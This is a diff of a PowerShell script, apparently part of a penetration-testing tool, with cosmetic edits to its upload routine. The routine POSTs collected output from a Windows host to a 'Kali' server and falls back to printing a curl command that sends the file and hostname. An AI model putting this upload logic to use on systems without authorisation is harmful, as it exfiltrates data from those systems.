@@ -144,10 +144,9 @@ if (-not (Test-Path $TmpOutput) -or (Get-Item $TmpOutput).Length -eq 0) {
 $OutputSize = (Get-Item $TmpOutput).Length
 Write-Host "[+] Final output size: $([Math]::Round($OutputSize / 1KB, 2)) KB" -ForegroundColor Green
 Write-Host ""
-Write-Host "[*] Last 10 lines of output:" -ForegroundColor Yellow
-Write-Host "----------------------------------------" -ForegroundColor Yellow
-Get-Content $TmpOutput -Tail 10 | ForEach-Object { Write-Host $_ }
-Write-Host "----------------------------------------" -ForegroundColor Yellow
+
+# Skip tail display to avoid hanging with large files in PS 2.0
+Write-Host "[*] Output saved, preparing upload..." -ForegroundColor Yellow
 Write-Host ""
 
 # Test connection before upload
@@ -168,7 +167,7 @@ Write-Host "[*] Upload endpoint: $ServerUrl/upload" -ForegroundColor Cyan
 Write-Host "[*] File to upload: $TmpOutput ($([Math]::Round($OutputSize / 1KB, 2)) KB)" -ForegroundColor Cyan
 Write-Host ""
 
-# Send to Kali with retry logic and progress bar
+# Send to Kali with retry logic
 $MaxRetries = 3
 $RetryCount = 0
 $Success = $false
@@ -189,18 +188,15 @@ while ($RetryCount -lt $MaxRetries -and -not $Success) {
         
         Write-Host "[*] Uploading to $ServerUrl/upload ..." -ForegroundColor Cyan
         
-        # Note: UploadProgressChanged may not work in all PowerShell versions
-        # So we do a simple synchronous upload
         $ResponseBytes = $WebClient.UploadData("$ServerUrl/upload", "POST", $FileBytes)
         $ResponseText = [System.Text.Encoding]::UTF8.GetString($ResponseBytes)
         
         Write-Host "[+] Upload complete!" -ForegroundColor Green
         Write-Host "[+] Transfer successful!" -ForegroundColor Green
-        Write-Host "[*] Server response: $ResponseText" -ForegroundColor Cyan
         
         # Try to extract report URL from response
         try {
-            # Simple regex to extract report_url from JSON (no ConvertFrom-Json in PS 2.0)
+            # Simple regex to extract report_url from JSON
             if ($ResponseText -match '"report_url"\s*:\s*"([^"]+)"') {
                 $ReportUrl = $matches[1]
                 Write-Host "[+] View report at: $ServerUrl$ReportUrl" -ForegroundColor Green
@@ -238,7 +234,7 @@ if ($Success) {
 } else {
     Write-Host "[!] Transfer failed after $MaxRetries attempts" -ForegroundColor Red
     Write-Host "[*] Output saved locally at: $TmpOutput" -ForegroundColor Yellow
-    Write-Host "[*] You can manually upload with:" -ForegroundColor Yellow
+    Write-Host "[*] You can manually upload with curl:" -ForegroundColor Yellow
     Write-Host "    curl -X POST --data-binary @'$TmpOutput' -H 'X-Hostname: $Hostname' $ServerUrl/upload" -ForegroundColor Yellow
     exit 1
 }
